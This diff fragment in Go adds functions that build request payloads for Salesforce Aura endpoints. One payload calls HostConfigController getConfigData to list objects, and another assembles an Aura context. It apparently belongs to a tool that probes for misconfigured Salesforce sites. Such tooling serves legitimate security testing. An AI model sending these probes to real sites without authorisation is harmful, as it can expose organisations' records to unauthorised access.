@@ -90,3 +90,41 @@ func PayloadGeneratorSearchObj(objectName string, page_size int, page int) []byt
 	}
 	return genPOC
 }
+
+func PayloadGeneratorObjectList() []byte {
+
+	payload1 := `[{"id":"Cirrus","descriptor":"aura://HostConfigController/ACTION$getConfigData","callingDescriptor":"UHNKNOWN","params":{}}]`
+	finalpayload := []byte(payload1)
+	p := payload{
+		Massage: json.RawMessage(finalpayload),
+	}
+	genPOC, err := json.Marshal(p)
+	if err != nil {
+		panic(err)
+	}
+	return genPOC
+
+}
+
+
+func PayloadGeneratorAuraContext(fwuid string, app string, markup string) []byte {
+
+	payload1 := `{"mode":"PROD",`
+	payload2 := fwuid
+	payload3 := `,`
+	payload4 := app
+	payload5 := `,"loaded":{`
+	payload6 := markup
+	payload7 := `},"dn":[],"globals":{},"uad":false}`
+	finalpayload := []byte(payload1 + payload2 + payload3 + payload4 + payload5 + payload6 + payload7)
+	finalpayloads := json.RawMessage(finalpayload)
+	genPOC, err := json.Marshal(finalpayloads)
+
+	if err != nil {
+		panic(err)
+	}
+	return genPOC
+
+}
+
+
